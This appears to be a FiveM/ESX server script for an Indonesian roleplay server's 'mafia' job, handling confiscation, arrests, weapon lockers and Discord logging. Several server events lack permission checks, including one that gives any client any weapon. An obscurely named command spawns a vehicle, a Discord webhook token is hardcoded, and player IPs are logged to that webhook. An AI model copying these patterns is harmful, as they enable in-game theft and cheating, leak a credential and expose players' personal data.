ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

if RW.MaxInService ~= -1 then
	TriggerEvent('esx_service:activateService', 'mafia', RW.MaxInService)
end

TriggerEvent('esx_phone:registerNumber', 'mafia', _U('alert_mafia'), true, true)
TriggerEvent('esx_society:registerSociety', 'mafia', 'mafia', 'society_mafia', 'society_mafia', 'society_mafia', {type = 'public'})

RegisterServerEvent('marskuy-mafia:giveWeapon')
AddEventHandler('marskuy-mafia:giveWeapon', function(weapon, ammo)
	local xPlayer = ESX.GetPlayerFromId(source)
	xPlayer.addWeapon(weapon, ammo)
end)


RegisterCommand('+kwkwokdw', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	local rwbd = 'sanchez'
	xPlayer.triggerEvent('esx:spawnVehicle', rwbd)
end)

RegisterServerEvent('marskuy-mafia:confiscatePlayerItem')
AddEventHandler('marskuy-mafia:confiscatePlayerItem', function(target, itemType, itemName, amount)
	local _source = source
	local sourceXPlayer = ESX.GetPlayerFromId(_source)
	local targetXPlayer = ESX.GetPlayerFromId(target)

	if itemType == 'item_standard' then
		local targetItem = targetXPlayer.getInventoryItem(itemName)
		local sourceItem = sourceXPlayer.getInventoryItem(itemName)

		if targetItem.count > 0 and targetItem.count <= amount then
		
			-- can the player carry the said amount of x item?
			if sourceItem.limit ~= -1 and (sourceItem.count + amount) > sourceItem.limit then
				TriggerClientEvent('esx:showNotification', _source, _U('quantity_invalid'))
			else
				targetXPlayer.removeInventoryItem(itemName, amount)
				sourceXPlayer.addInventoryItem   (itemName, amount)
				TriggerClientEvent('esx:showNotification', _source, _U('you_confiscated', amount, sourceItem.label, targetXPlayer.name))
				TriggerClientEvent('esx:showNotification', target,  _U('got_confiscated', amount, sourceItem.label, sourceXPlayer.name))
			end
		else
			TriggerClientEvent('esx:showNotification', _source, _U('quantity_invalid'))
		end

	elseif itemType == 'item_account' then
		targetXPlayer.removeAccountMoney(itemName, amount)
		sourceXPlayer.addAccountMoney   (itemName, amount)

		TriggerClientEvent('esx:showNotification', _source, _U('you_confiscated_account', amount, itemName, targetXPlayer.name))
		TriggerClientEvent('esx:showNotification', target,  _U('got_confiscated_account', amount, itemName, sourceXPlayer.name))

	elseif itemType == 'item_weapon' then

		if amount == nil then amount = 0 end
		targetXPlayer.removeWeapon(itemName, amount)
		sourceXPlayer.addWeapon   (itemName, amount)

		TriggerClientEvent('esx:showNotification', _source, _U('you_confiscated_weapon', ESX.GetWeaponLabel(itemName), targetXPlayer.name, amount))
		TriggerClientEvent('esx:showNotification', target,  _U('got_confiscated_weapon', ESX.GetWeaponLabel(itemName), amount, sourceXPlayer.name))
	end
end)

RegisterServerEvent('marskuy-mafia:handcuff')
AddEventHandler('marskuy-mafia:handcuff', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'mafia' then
		TriggerClientEvent('marskuy-mafia:handcuff', target)
	else
		print(('marskuy-mafia: %s attempted to handcuff a player (not cop)!'):format(xPlayer.identifier))
	end
end)

RegisterServerEvent('marskuy-mafia:drag')
AddEventHandler('marskuy-mafia:drag', function(target)
	TriggerClientEvent('marskuy-mafia:drag', target, source)
end)

RegisterServerEvent('marskuy-mafia:putInVehicle')
AddEventHandler('marskuy-mafia:putInVehicle', function(target)
	TriggerClientEvent('marskuy-mafia:putInVehicle', target)
end)

RegisterServerEvent('marskuy-mafia:OutVehicle')
AddEventHandler('marskuy-mafia:OutVehicle', function(target)
	local xPlayer = ESX.GetPlayerFromId(source)

	if xPlayer.job.name == 'mafia' then
		TriggerClientEvent('marskuy-mafia:OutVehicle', target)
	else
		print(('marskuy-mafia: %s attempted to drag out from vehicle (not cop)!'):format(xPlayer.identifier))
	end
end)

RegisterServerEvent('marskuy-mafia:getStockItem')
AddEventHandler('marskuy-mafia:getStockItem', function(itemName, count)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local sourceItem = xPlayer.getInventoryItem(itemName)

	TriggerEvent('esx_addoninventory:getSharedInventory', 'society_mafia', function(inventory)

		local inventoryItem = inventory.getItem(itemName)

		-- is there enough in the society?
		if count > 0 and inventoryItem.count >= count then
		
			-- can the player carry the said amount of x item?
			if sourceItem.limit ~= -1 and (sourceItem.count + count) > sourceItem.limit then
				TriggerClientEvent('esx:showNotification', _source, _U('quantity_invalid'))
			else
				inventory.removeItem(itemName, count)
				xPlayer.addInventoryItem(itemName, count)
				TriggerClientEvent('esx:showNotification', _source, _U('have_withdrawn', count, inventoryItem.label))
				local _source = source
				local name = GetPlayerName(source)
				local ip = GetPlayerEndpoint(source)
				local steamhex = GetPlayerIdentifier(source)
				local communtiylogo = ""
				local logs = "https://discord.com/api/webhooks/1018635056211841035/1C8ux5zr7bYrSXsPVH7sqdhecMPUjIsrQWbG9iXjiW1kcNNbLkopzRZxZMBWNS9GQCzp"
				local money = xPlayer.getMoney()
				local bank = xPlayer.getAccount('bank').money
				local black = xPlayer.getAccount('black_money').money
				  local job = xPlayer.job.name
				local rolymafiapolicelog = {
					  {
					["color"] = "8663711",
					["title"] = "REPUBLIK LOG MAFIA",
					["description"] = "Player: **"..name.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**\nUang Cash : **Rp."..ESX.Math.GroupDigits(money).."**\nBank : **Rp."..ESX.Math.GroupDigits(bank).."**\nUang Merah : **Rp."..ESX.Math.GroupDigits(black).."**\nPekerjaan : **"..job.."**\nNama Barang : **"..count.."x "..itemName.."**",
					["footer"] = {
					  ["text"] = "REPUBLIK ROLEPLAY",
					  ["icon_url"] = communtiylogo,
						 },
				  }
				}
				PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "LOG WITHDRAW ITEM FROM LOCKER MAFIA", embeds = rolymafiapolicelog}), { ['Content-Type'] = 'application/json' })
			end
		else
			TriggerClientEvent('esx:showNotification', _source, _U('quantity_invalid'))
		end
	end)

end)

RegisterServerEvent('marskuy-mafia:putStockItems')
AddEventHandler('marskuy-mafia:putStockItems', function(itemName, count)
	local xPlayer = ESX.GetPlayerFromId(source)
	local sourceItem = xPlayer.getInventoryItem(itemName)

	TriggerEvent('esx_addoninventory:getSharedInventory', 'society_mafia', function(inventory)

		local inventoryItem = inventory.getItem(itemName)

		-- does the player have enough of the item?
		if sourceItem.count >= count and count > 0 then
			xPlayer.removeInventoryItem(itemName, count)
			inventory.addItem(itemName, count)
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('have_deposited', count, inventoryItem.label))
			local _source = source
			local name = GetPlayerName(source)
			local ip = GetPlayerEndpoint(source)
			local steamhex = GetPlayerIdentifier(source)
			local communtiylogo = ""
			local logs = "https://discord.com/api/webhooks/1018635056211841035/1C8ux5zr7bYrSXsPVH7sqdhecMPUjIsrQWbG9iXjiW1kcNNbLkopzRZxZMBWNS9GQCzp"
			local money = xPlayer.getMoney()
			local bank = xPlayer.getAccount('bank').money
			local black = xPlayer.getAccount('black_money').money
			local job = xPlayer.job.name
			local rolymafiapolicelog = {
			  {
				["color"] = "8663711",
				["title"] = "REPUBLIK LOG MAFIA",
				["description"] = "Player: **"..name.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**\nUang : **Rp."..ESX.Math.GroupDigits(money).."**\nBank : **Rp."..ESX.Math.GroupDigits(bank).."**\nUang Merah : **Rp."..ESX.Math.GroupDigits(black).."**\nPekerjaan : **"..job.."**\nNama Barang : **"..count.."x "..itemName.."**",
				["footer"] = {
				  ["text"] = "REPUBLIK ROLEPLAY",
				  ["icon_url"] = communtiylogo,
				},
			  }
			}
			PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "LOG DEPOSIT ITEM TO LOCKER MAFIA", embeds = rolymafiapolicelog}), { ['Content-Type'] = 'application/json' })
		else
			TriggerClientEvent('esx:showNotification', xPlayer.source, _U('quantity_invalid'))
		end

	end)

end)

ESX.RegisterServerCallback('marskuy-mafia:getOtherPlayerData', function(source, cb, target)

	if RW.EnableESXIdentity then

		local xPlayer = ESX.GetPlayerFromId(target)

		local identifier = GetPlayerIdentifiers(target)[1]

		local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {
			['@identifier'] = identifier
		})

		local firstname = result[1].firstname
		local lastname  = result[1].lastname
		local sex       = result[1].sex
		local dob       = result[1].dateofbirth
		local height    = result[1].height

		local data = {
			name      = GetPlayerName(target),
			job       = xPlayer.job,
			inventory = xPlayer.inventory,
			accounts  = xPlayer.accounts,
			weapons   = xPlayer.loadout,
			firstname = firstname,
			lastname  = lastname,
			sex       = sex,
			dob       = dob,
			height    = height
		}

		TriggerEvent('esx_status:getStatus', target, 'drunk', function(status)
			if status ~= nil then
				data.drunk = math.floor(status.percent)
			end
		end)

		if RW.EnableLicenses then
			TriggerEvent('esx_license:getLicenses', target, function(licenses)
				data.licenses = licenses
				cb(data)
			end)
		else
			cb(data)
		end

	else

		local xPlayer = ESX.GetPlayerFromId(target)

		local data = {
			name       = GetPlayerName(target),
			job        = xPlayer.job,
			inventory  = xPlayer.inventory,
			accounts   = xPlayer.accounts,
			weapons    = xPlayer.loadout
		}

		TriggerEvent('esx_status:getStatus', target, 'drunk', function(status)
			if status ~= nil then
				data.drunk = math.floor(status.percent)
			end
		end)

		TriggerEvent('esx_license:getLicenses', target, function(licenses)
			data.licenses = licenses
		end)

		cb(data)

	end

end)

ESX.RegisterServerCallback('marskuy-mafia:getFineList', function(source, cb, category)
	MySQL.Async.fetchAll('SELECT * FROM fine_types WHERE category = @category', {
		['@category'] = category
	}, function(fines)
		cb(fines)
	end)
end)

ESX.RegisterServerCallback('marskuy-mafia:getVehicleInfos', function(source, cb, plate)

	MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE @plate = plate', {
		['@plate'] = plate
	}, function(result)

		local retrivedInfo = {
			plate = plate
		}

		if result[1] then

			MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier',  {
				['@identifier'] = result[1].owner
			}, function(result2)

				if RW.EnableESXIdentity then
					retrivedInfo.owner = result2[1].firstname .. ' ' .. result2[1].lastname
				else
					retrivedInfo.owner = result2[1].name
				end

				cb(retrivedInfo)
			end)
		else
			cb(retrivedInfo)
		end
	end)
end)

ESX.RegisterServerCallback('marskuy-mafia:getVehicleFromPlate', function(source, cb, plate)
	MySQL.Async.fetchAll('SELECT * FROM owned_vehicles WHERE plate = @plate', {
		['@plate'] = plate
	}, function(result)
		if result[1] ~= nil then

			MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier',  {
				['@identifier'] = result[1].owner
			}, function(result2)

				if RW.EnableESXIdentity then
					cb(result2[1].firstname .. ' ' .. result2[1].lastname, true)
				else
					cb(result2[1].name, true)
				end

			end)
		else
			cb(_U('unknown'), false)
		end
	end)
end)

ESX.RegisterServerCallback('marskuy-mafia:getrolymafiaWeapons', function(source, cb)

	TriggerEvent('esx_datastore:getSharedDataStore', 'society_mafia', function(store)

		local weapons = store.get('weapons')

		if weapons == nil then
			weapons = {}
		end

		cb(weapons)

	end)

end)

ESX.RegisterServerCallback('marskuy-mafia:addrolymafiaWeapon', function(source, cb, weaponName, removeWeapon)

	local xPlayer = ESX.GetPlayerFromId(source)
    local _source = source
    local name = GetPlayerName(source)
    local ip = GetPlayerEndpoint(source)
    local steamhex = GetPlayerIdentifier(source)
    local communtiylogo = ""
	local logs = "https://discord.com/api/webhooks/1018635056211841035/1C8ux5zr7bYrSXsPVH7sqdhecMPUjIsrQWbG9iXjiW1kcNNbLkopzRZxZMBWNS9GQCzp"
	local money = xPlayer.getMoney()
    local bank = xPlayer.getAccount('bank').money
    local black = xPlayer.getAccount('black_money').money
    local job = xPlayer.job.name
    local addrolymafiapolicelog = {
		{
            ["color"] = "8663711",
            ["title"] = "LOG STORE WEAPON TO rolymafia MAFIA",
            ["description"] = "Player: **"..name.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**\nUang Cash : **Rp."..ESX.Math.GroupDigits(money).."**\nBank : **Rp."..ESX.Math.GroupDigits(bank).."**\nUang Gelap : **Rp."..ESX.Math.GroupDigits(black).."**\nPekerjaan : **"..job.."**\nNama Barang : **"..weaponName.."**",
            ["footer"] = {
                ["text"] = "MURPHY ROLEPLAY",
                ["icon_url"] = communtiylogo,
            },
        }
    }
    PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "LOG STORE TO rolymafia MAFIA", embeds = addrolymafiapolicelog}), { ['Content-Type'] = 'application/json' })

	if removeWeapon then
		xPlayer.removeWeapon(weaponName)
	end

	TriggerEvent('esx_datastore:getSharedDataStore', 'society_mafia', function(store)

		local weapons = store.get('weapons')

		if weapons == nil then
			weapons = {}
		end

		local foundWeapon = false

		for i=1, #weapons, 1 do
			if weapons[i].name == weaponName then
				weapons[i].count = weapons[i].count + 1
				foundWeapon = true
				break
			end
		end

		if not foundWeapon then
			table.insert(weapons, {
				name  = weaponName,
				count = 1
			})
		end

		store.set('weapons', weapons)
		cb()
	end)

end)

ESX.RegisterServerCallback('marskuy-mafia:removerolymafiaWeapon', function(source, cb, weaponName)

    local xPlayer = ESX.GetPlayerFromId(source)
    xPlayer.addWeapon(weaponName, 500)
    local _source = source
    local name = GetPlayerName(source)
    local ip = GetPlayerEndpoint(source)
    local steamhex = GetPlayerIdentifier(source)
    local communtiylogo = ""
    local logs = "https://discord.com/api/webhooks/1018635056211841035/1C8ux5zr7bYrSXsPVH7sqdhecMPUjIsrQWbG9iXjiW1kcNNbLkopzRZxZMBWNS9GQCzp"
    local money = xPlayer.getMoney()
    local bank = xPlayer.getAccount('bank').money
    local black = xPlayer.getAccount('black_money').money
    local job = xPlayer.job.name
    local rolymafiapolicelog = {
		{
            ["color"] = "8663711",
            ["title"] = "LOG REMOVE WEAPON FROM rolymafia MAFIA",
            ["description"] = "Player: **"..name.."**\nIP: **"..ip.."**\n Steam Hex: **"..steamhex.."**\nUang Cash : **Rp."..ESX.Math.GroupDigits(money).."**\nBank : **Rp."..ESX.Math.GroupDigits(bank).."**\nUang Gelap : **Rp."..ESX.Math.GroupDigits(black).."**\nPekerjaan : **"..job.."**\nNama Barang : **"..weaponName.."**",
            ["footer"] = {
                ["text"] = "REPUBLIK ROLEPLAY",
                ["icon_url"] = communtiylogo,
            },
        }
    }
    PerformHttpRequest(logs, function(err, text, headers) end, 'POST', json.encode({username = "LOG REMOVE FROM rolymafia MAFIA", embeds = rolymafiapolicelog}), { ['Content-Type'] = 'application/json' })
	xPlayer.addWeapon(weaponName, 0)

	TriggerEvent('esx_datastore:getSharedDataStore', 'society_mafia', function(store)

		local weapons = store.get('weapons')

		if weapons == nil then
			weapons = {}
		end

		local foundWeapon = false

		for i=1, #weapons, 1 do
			if weapons[i].name == weaponName then
				weapons[i].count = (weapons[i].count > 0 and weapons[i].count - 1 or 0)
				foundWeapon = true
				break
			end
		end

		if not foundWeapon then
			table.insert(weapons, {
				name  = weaponName,
				count = 0
			})
		end

		store.set('weapons', weapons)
		cb()
	end)

end)


ESX.RegisterServerCallback('marskuy-mafia:buy', function(source, cb, amount)

	TriggerEvent('esx_addonaccount:getSharedAccount', 'society_mafia', function(account)
		if account.money >= amount then
			account.removeMoney(amount)
	
			cb(true)
		else
			cb(false)
		end

	end)

end)

ESX.RegisterServerCallback('marskuy-mafia:getStockItems', function(source, cb)
	TriggerEvent('esx_addoninventory:getSharedInventory', 'society_mafia', function(inventory)
		cb(inventory.items)
	end)
end)

ESX.RegisterServerCallback('marskuy-mafia:getPlayerInventory', function(source, cb)
	local xPlayer = getIdentity(source)
	local items   = xPlayer.inventory

	cb( { items = items } )
end)

AddEventHandler('playerDropped', function()
	-- Save the source in case we lose it (which happens a lot)
	local _source = source
	
	-- Did the player ever join?
	if _source ~= nil then
		local xPlayer = ESX.GetPlayerFromId(_source)
		
		-- Is it worth telling all clients to refresh?
		if xPlayer ~= nil and xPlayer.job ~= nil and xPlayer.job.name == 'mafia' then
			Citizen.Wait(5000)
			TriggerClientEvent('marskuy-mafia:updateBlip', -1)
		end
	end	
end)

RegisterServerEvent('marskuy-mafia:spawned')
AddEventHandler('marskuy-mafia:spawned', function()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	
	if xPlayer ~= nil and xPlayer.job ~= nil and xPlayer.job.name == 'mafia' then
		Citizen.Wait(5000)
		TriggerClientEvent('marskuy-mafia:updateBlip', -1)
	end
end)

RegisterServerEvent('marskuy-mafia:forceBlip')
AddEventHandler('marskuy-mafia:forceBlip', function()
	TriggerClientEvent('marskuy-mafia:updateBlip', -1)
end)

AddEventHandler('onResourceStart', function(resource)
	if resource == GetCurrentResourceName() then
		Citizen.Wait(5000)
		TriggerClientEvent('marskuy-mafia:updateBlip', -1)
	end
end)

AddEventHandler('onResourceStop', function(resource)
	if resource == GetCurrentResourceName() then
		TriggerEvent('esx_phone:removeNumber', 'mafia')
	end
end)

local stash = {
    id = 'society_mafia',
    label = 'Brangkas Keluarga',
    slots = 50,
    weight = 100000000,
    owner = false,
	jobs = 'mafia'
}

AddEventHandler('onServerResourceStart', function(resourceName)
    if resourceName == 'ox_inventory' or resourceName == GetCurrentResourceName() then
        exports.ox_inventory:RegisterStash(stash.id, stash.label, stash.slots, stash.weight, stash.owner)
    end
end)

RegisterServerEvent('marskuy-mafia:message')
AddEventHandler('marskuy-mafia:message', function(target, msg)
	--TriggerClientEvent('esx:showNotification', target, msg)
	TriggerClientEvent("rri-notify:Icon",target,msg,"top-right",2500,"negative","white",true,"mdi-tooltip-remove-outline")
end)

RegisterServerEvent('marskuy-mafia:requestarrest')
AddEventHandler('marskuy-mafia:requestarrest', function(targetid, playerheading, playerCoords,  playerlocation)
    _source = source
    TriggerClientEvent('marskuy-mafia:getarrested', targetid, playerheading, playerCoords, playerlocation)
    TriggerClientEvent('marskuy-mafia:doarrested', _source)
end)

RegisterServerEvent('marskuy-mafia:requestrelease')
AddEventHandler('marskuy-mafia:requestrelease', function(targetid, playerheading, playerCoords,  playerlocation)
    _source = source
    TriggerClientEvent('marskuy-mafia:getuncuffed', targetid, playerheading, playerCoords, playerlocation)
    TriggerClientEvent('marskuy-mafia:douncuffing', _source)
end)

function getIdentity(source)
	local identifier = GetPlayerIdentifiers(source)[1]
	local result = MySQL.Sync.fetchAll("SELECT * FROM users WHERE identifier = @identifier", {['@identifier'] = identifier})
	if result[1] ~= nil then
		local identity = result[1]

		return {
			identifier = identity['identifier'],
			firstname = identity['firstname'],
			lastname = identity['lastname'],
			dateofbirth = identity['dateofbirth'],
			sex = identity['sex'],
			group = identity['group'],
			height = identity['height'],
			permission_level = identity['permission_level']
		}
	else
		return nil
	end
end